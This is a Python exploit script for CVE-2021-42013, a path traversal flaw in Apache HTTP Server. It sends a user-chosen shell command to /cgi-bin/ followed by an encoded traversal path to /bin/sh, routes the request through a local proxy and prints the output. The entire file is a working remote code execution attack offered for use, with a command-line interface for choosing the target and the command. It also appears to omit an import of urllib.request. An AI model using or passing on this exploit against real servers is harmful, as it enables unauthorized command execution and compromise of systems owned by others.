#!/usr/bin/python3
import sys
import os
import re
import argparse
import requests
from os import path
import urllib
import urllib.parse
import time

class Interface ():
	def __init__ (self):
		self.red = '\033[91m'
		self.green = '\033[92m'
		self.white = '\033[37m'
		self.yellow = '\033[93m'
		self.bold = '\033[1m'
		self.end = '\033[0m'

	def header(self):
		print('\n    >> CVE-2021-42013 - Remote Code Execution')
		print('    >> by twseptian\n')

	def info (self, message):
		print(f"[{self.white}*{self.end}] {message}")

	def warning (self, message):
		print(f"[{self.yellow}!{self.end}] {message}")

	def error (self, message):
		print(f"[{self.red}x{self.end}] {message}")

	def success (self, message):
		print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

class Exploit:
    def __init__(self, target_ip, target_port, payload, shell):
        self.target_ip = target_ip
        self.target_port = target_port
        self.payload = payload
        self.shell = shell

    def check_vuln(self):
        proxies = '127.0.0.1:8080'
        path = '/cgi-bin/'
        data = "echo; {}".format(shell)
        data = data.encode("ascii")
        header = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
			'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
			'Accept-Encoding': 'gzip, deflate',
			'Connection': 'close',
			'Content-Type': 'text/html;charset=UTF8',
			'Upgrade-Insecure-Requests': '1',
			'Cache-Control': 'max-age=0'
			}
        output.warning("Payload: "+ payload)
        output.warning("Command: "+ shell)
        safe_payload = urllib.parse.quote(payload, safe="/%")
        url = "http://" + target_ip + ':' + target_port + path + safe_payload + '/bin/sh'
        request = urllib.request.Request(url,data=data,headers=header)
        request.set_proxy(proxies, 'http')
        response = urllib.request.urlopen(request)
        status_code = response.getcode()
        if (status_code == 200):
            res = response.read().decode("utf-8")
            print(res)
        else:
            output.error("Path " + path + " not found or error occured!")
            time.sleep(1)
            sys.exit(-1)

def get_args():
    parser = argparse.ArgumentParser(description='CVE-2021-42013 - Path Traversal')
    parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
    parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
    parser.add_argument('-x', '--execute', dest="payload", required=True, action='store', help='Path Traversal Payload')
    parser.add_argument('-s', '--shell', dest="shell", required=True, action='store', help='shell')
    args = parser.parse_args()
    return args

args = get_args()
target_ip = args.url
target_port = args.target_port
payload = args.payload
shell = args.shell

exp = Exploit(target_ip, target_port, payload,shell)
exp.check_vuln()
